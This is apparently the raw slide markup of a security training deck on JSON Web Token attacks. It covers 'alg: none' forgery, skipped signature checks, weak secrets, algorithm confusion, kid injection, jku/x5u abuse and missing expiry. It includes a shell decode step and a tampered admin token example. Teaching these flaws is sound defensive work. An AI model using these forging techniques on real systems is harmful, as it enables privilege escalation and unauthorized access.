              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="643" name="Google Shape;643;p41"/>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"alg": "none" and friends</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="644" name="Google Shape;644;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965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45" name="Google Shape;645;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="2122871"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="646" name="Google Shape;646;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="1920240"/>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alg: none</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="647" name="Google Shape;647;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="2286000"/>
            <a:ext cx="49377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The token says 'I'm unsigned.' A sloppy library believes it and skips verification.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="648" name="Google Shape;648;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="315468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49" name="Google Shape;649;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="3311591"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="650" name="Google Shape;650;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3108960"/>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Signature never checked</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="651" name="Google Shape;651;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="3474720"/>
            <a:ext cx="49377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Some apps decode the payload but never validate the signature at all. Edit freely.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="652" name="Google Shape;652;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="43434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53" name="Google Shape;653;p41"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="796991" y="4500311"/>
            <a:ext cx="289682" cy="289682"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="654" name="Google Shape;654;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4297680"/>
            <a:ext cx="49377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Weak / known secret</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1600" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="655" name="Google Shape;655;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1463040" y="4663440"/>
            <a:ext cx="4937760" cy="8046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HS256 signed with 'secret' or a leaked key - re-sign your forged token yourself.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1250" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="656" name="Google Shape;656;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2148840"/>
            <a:ext cx="4709160" cy="3566160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 2051"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7" name="Google Shape;657;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7114032" y="238658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41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7351776" y="238658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9" name="Google Shape;659;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="238658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p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7955280" y="2221992"/>
            <a:ext cx="3429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forge an admin token</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1000" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="661" name="Google Shape;661;p41"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="2679192"/>
            <a:ext cx="4709160" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln cap="flat" cmpd="sng" w="12700">
            <a:solidFill>
              <a:srgbClr val="30363D"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
            <a:round/>
            <a:headEnd len="sm" w="sm" type="none"/>
            <a:tailEnd len="sm" w="sm" type="none"/>
          </a:ln>
        </p:spPr>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="662" name="Google Shape;662;p41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7132320" y="2807208"/>
            <a:ext cx="4160520" cy="27432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decode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echo $JWT|cut -d. -f2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|tr '_-' '/+'|base64 -d  # url</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{"user":"jeff","role":"user"}</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tamper -&gt; role:admin, alg:none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58A6FF"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="58A6FF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>{"alg":"none"}.{"role":"admin"}.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note the empty 3rd segment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D29922"/>
              </a:buClr>
              <a:buSzPts val="1300"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1300" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t># (the trailing dot stays!)</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1300" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="663" name="Google Shape;663;p41"/>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p41"/>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665" name="Google Shape;665;p41"/>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70" name="Shape 670"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="671" name="Google Shape;671;p42"/>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200"/>
              <a:buFont typeface="Courier New"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1200" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D29922"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:ea typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
                <a:sym typeface="Courier New"/>
              </a:rPr>
              <a:t>BEYOND ALG:NONE</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1200" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="672" name="Google Shape;672;p42"/>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JWT: the bigger attack surface</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="3800" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="673" name="Google Shape;673;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1965960"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 64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4" name="Google Shape;674;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="225856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75" name="Google Shape;675;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038758" y="2401214"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="676" name="Google Shape;676;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="214884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Algorithm confusion</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="677" name="Google Shape;677;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="251460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Server expects RS256 - sign HS256 using the public key as the secret.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="678" name="Google Shape;678;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1965960"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 640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p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="225856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80" name="Google Shape;680;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6433718" y="2401214"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="681" name="Google Shape;681;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="214884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Weak / cracked secret</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="682" name="Google Shape;682;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="251460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HS256 with a guessable key: crack it offline (hashcat, jwt_tool).</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="683" name="Google Shape;683;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="3291840"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 64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4" name="Google Shape;684;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="358444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85" name="Google Shape;685;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038758" y="3727094"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="686" name="Google Shape;686;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="347472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kid injection</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="687" name="Google Shape;687;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="384048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The kid header selects the key - abuse it for path traversal or SQLi.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="688" name="Google Shape;688;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="3291840"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 640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p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="358444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90" name="Google Shape;690;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6433718" y="3727094"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="691" name="Google Shape;691;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="347472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jku / x5u header</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="692" name="Google Shape;692;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="384048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Point the key-set URL at a server you control, then self-sign.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="693" name="Google Shape;693;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4617720"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 64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4" name="Google Shape;694;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="896112" y="491032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695" name="Google Shape;695;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId7">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1038758" y="5052974"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="696" name="Google Shape;696;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="480060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No expiry / replay</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="697" name="Google Shape;697;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1600200" y="516636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exp not enforced? A leaked token works forever.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="698" name="Google Shape;698;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="4617720"/>
            <a:ext cx="5212080" cy="1143000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd fmla="val 640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42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6291072" y="4910328"/>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00" name="Google Shape;700;p42"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId8">
            <a:alphaModFix/>
          </a:blip>
          <a:srcRect b="0" l="0" r="0" t="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6433718" y="5052974"/>
            <a:ext cx="263347" cy="263347"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="701" name="Google Shape;701;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="4800600"/>
            <a:ext cx="40690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500"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="1" i="0" lang="en-US" sz="1500" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="E6EDF3"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>Readable claims</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1500" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
              </a:solidFill>
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
              <a:sym typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="702" name="Google Shape;702;p42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6995160" y="5166360"/>
            <a:ext cx="4069080" cy="5486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8B949E"/>
              </a:buClr>
              <a:buSzPts val="1100"/>
              <a:buFont typeface="Arial"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr b="0" i="0" lang="en-US" sz="1100" u="none" cap="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="8B949E"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:ea typeface="Arial"/>
                <a:cs typeface="Arial"/>
                <a:sym typeface="Arial"/>
              </a:rPr>
              <a:t>It's only base64 - PII and secrets sit in the payload in clear.</a:t>
            </a:r>
            <a:endParaRPr b="0" i="0" sz="1100" u="none" cap="none" strike="noStrike">
              <a:solidFill>
                <a:schemeClr val="dk1"/>
